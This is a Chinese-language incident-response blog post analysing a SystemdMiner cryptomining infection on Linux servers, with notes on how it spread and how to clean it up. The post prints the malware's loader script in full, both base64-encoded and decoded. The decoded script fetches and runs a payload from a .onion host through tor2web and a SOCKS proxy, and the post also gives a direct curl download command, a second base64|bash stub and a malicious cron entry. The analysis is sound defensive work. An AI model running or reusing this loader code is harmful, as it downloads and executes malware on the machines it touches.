---
layout: post
title:  "SystemdMiner挖矿事件分析"
categories: 应急响应
tags: Hadoop 挖矿 SystemdMiner
author: 0e0w
---

* content
{:toc}
这是一篇关于SystemdMiner木马挖矿事件分析的文章。由于作者能力有限，文中难免会出现一些错误，请谅解。本文创建时间为2020年6月18日，最近一次更新时间为2020年6月21日。本文会不定期更新。
## 0x01 基本概述

2020年6月16日接到消息，大量机器被挖矿。根据相关的信息，发现为SystemdMiner病毒。

## 0x02 样本分析

- ls -la

  发现ryukd.sh文件时间被修改过，修改成了2015年或2017年。

  ```bash
  -rwxr-xr-x.  1 root root    1468 Aug 12  2017 .ryukd.sh
  ```

- cat .ryukd.sh

  ```bash
  [root@192 ~]# cat .ryukd.sh 
  #!/bin/bash
  exec &>/dev/null
  echo CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE
  echo Q2dSdmx1aStyUGtpQ3E3ZmdhclpuZTNhSTU0Q3o3MXVnZDhuUE1uR2V1Z294Zy9nUlpGQkF3Z3h6dEdxRjd4RQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJyeXVrZHNzdXNrb3ZobndiIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash
  
  ```

- 解密之后

  ```bash
  CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE
  exec &>/dev/null
  export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
  d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
  c=$(echo "curl -4fsSLkA- -m200")
  t=$(echo "ryukdssuskovhnwb")
  sockz() {
  n=(dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz)
  p=$(echo "dns-query?name=relay.tor2socks.in")
  s=$($c https://${n[$((RANDOM%5))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
  }
  fexe() {
  for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
  }
  u() {
  sockz
  fexe
  f=/int.$(uname -m)
  x=./$(date|md5sum|cut -f1 -d-)
  $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
  chmod +x $x;$x;rm -f $x
  }
  for h in tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su
  do
  if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; then
  u $t.$h
  else
  break
  fi
  done
  ```
  通过程序自带的socks5代理，下载暗网中ryukdssuskovhnwb.onion/int.x86_64文件。
  ```bash
  curl -4fsSLkA- -m200 -x socks5h://165.22.117.234:9050 ryukdssuskovhnwb.onion/int.x86_64 -o./d24e930116b812dc7ca9c410a615fe53
  #www.0e0w.com/zip/d24e930116b812dc7ca9c410a615fe53.7z
  ```
  
  暂时无分析d24e930116b812dc7ca9c410a615fe53的能力与精力。后续待进行。
  
- 其他的bash

  ```bash
  sh -c echo Q2dSdmx1aStyUGtpQ3E3ZmdhclpuZTNhSTU0Q3o3MXVnZDhuUE1uR2V1Z294Zy9nUlpGQkF3Z3h6dEdxRjd4RQpjaGF0dHIgLWkgL3RtcC8uWDExLXVuaXgKY2hhdHRyIC1SaSAvdG1wLy5YMTEtdW5peApbIC1mIC90bXAvLlgxMS11bml4IF0gJiYgcm0gLWYgL3RtcC8uWDExLXVuaXggClsgLWQgL3RtcC8uWDExLXVuaXggXSB8fCBta2RpciAtcCAvdG1wLy5YMTEtdW5peAo=|base64 -d|bash
  ```

  ```bash
  CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE
  chattr -i /tmp/.X11-unix
  chattr -Ri /tmp/.X11-unix
  [ -f /tmp/.X11-unix ] && rm -f /tmp/.X11-unix 
  [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix
  ```

- crontab -l

  每小时的14分钟执行定时任务，> /dev/null 2>&1 &不记录定时任务的日志。

  ```bash
  14 * * * * /root/.ryukd.sh > /dev/null 2>&1 &
  ```


## 0x03 传播方式

- SSH爆破

  ```
  cd /var/log && cat secure | grep "Accepted" && cat secure | grep "Failed"
  ```
  
- Hadoop RCE

  - 未找到Hadoop的Yarn访问日志，此处无法进行溯源。Hadoop Yarn未授权导致的RCE漏洞已经复现。	
  
- Redis RCE

## 0x04 木马清理

- top #查看进程
- kill -9 pid #删除病毒进程
- cd / && find . -name "\*ryukd*" #搜索存在病毒的目录
- chattr -i .ryukd.sh #对ryukd.sh文件进行降权处理
- rm -rf /root/.ryukd.sh #删除病毒文件
- rm -rf /opt/ryukd.sh
- crontab -e #编辑计划任务
- cat /tmp/.X11-unix/00#查看守护进程
- kill -9 pid #删除守护进程pid

## 0x05 追踪溯源

由于未找到Hadoop的访问日志，SSH登录的日志又太多。相关爆破的情况很多，暂时无法判断具体是如何入侵的。

## 0x06 参考链接

- https://blog.csdn.net/whatday/article/details/104079694
- https://s.tencent.com/research/report/900.html
- https://blog.netlab.360.com/systemdminer-propagation-through-ddg/
- https://www.freebuf.com/articles/system/225146.html

